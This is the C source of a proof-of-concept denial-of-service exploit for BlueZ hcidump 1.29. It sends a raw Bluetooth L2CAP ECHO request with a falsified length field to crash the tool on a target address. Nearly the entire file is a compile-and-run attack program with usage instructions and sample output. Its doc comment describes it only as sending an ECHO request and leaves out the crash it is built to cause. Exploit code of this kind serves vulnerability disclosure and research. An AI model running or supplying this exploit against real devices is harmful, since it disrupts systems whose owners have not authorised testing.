/*	Bluez hcidump v1.29 DoS - PoC code			*/
/* 	Pierre BETOUIN <pierre.betouin@security-labs.org>	*/
/*	01/18/06						*/
/*	Crashes hcidump sending bad L2CAP packet		*/
/*								*/
/*	gcc -lbluetooth hcidump-crash.c -o hcidump-crash	*/
/*	./hcidump-crash 00:80:37:XX:XX:XX			*/
/*	L2CAP packet sent (15)					*/
/*	Buffer: 08 01 0C 00 41 41 41 41 41 41 41 41 41 41 41	*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/l2cap.h>

#define SIZE		15
#define FAKE_SIZE	12

/**
 * @brief Main function to send an L2CAP ECHO request to a specified Bluetooth address.
 *
 * This function sets up a raw L2CAP socket, binds it to a Bluetooth device,
 * connects to the specified Bluetooth address, constructs an L2CAP ECHO request 
 * packet, sends it, and prints the packet contents in hexadecimal format.
 *
 * @param argc The count of command-line arguments.
 * @param argv The array of command-line argument strings.
 *
 * @return Returns EXIT_SUCCESS on successful execution.
 */
int main(int argc, char **argv)
{
	char *packetBuffer;
	l2cap_cmd_hdr *l2capHeader;	
	struct sockaddr_l2 l2capAddress;
	int l2capSocket, bytesSent, index;

	if(argc < 2)
	{
		fprintf(stderr, "%s <btaddr>\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if ((l2capSocket = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) 
	{
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&l2capAddress, 0, sizeof(l2capAddress));
	l2capAddress.l2_family = AF_BLUETOOTH;

	if (bind(l2capSocket, (struct sockaddr *) &l2capAddress, sizeof(l2capAddress)) < 0) 
	{
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(argv[1], &l2capAddress.l2_bdaddr);
	
	if (connect(l2capSocket, (struct sockaddr *) &l2capAddress, sizeof(l2capAddress)) < 0) 
	{
		perror("connect");
		exit(EXIT_FAILURE);
	}
	
	if(!(packetBuffer = (char *) malloc ((int) SIZE + 1))) 
	{
		perror("malloc");
		exit(EXIT_FAILURE);
	}
	
	memset(packetBuffer, 'A', SIZE);

	l2capHeader = (l2cap_cmd_hdr *) packetBuffer;
	l2capHeader->code = L2CAP_ECHO_REQ;
	l2capHeader->ident = 1;
	l2capHeader->len = FAKE_SIZE;
	
	if((bytesSent = send(l2capSocket, packetBuffer, SIZE, 0)) >= 0)
	{
		printf("L2CAP packet sent (%d)\n", bytesSent);
	}

	printf("Buffer:\t");
	for(index = 0; index < bytesSent; index++)
		printf("%.2X ", (unsigned char) packetBuffer[index]);
	printf("\n");

	free(packetBuffer);
	close(l2capSocket);
	return EXIT_SUCCESS;
}
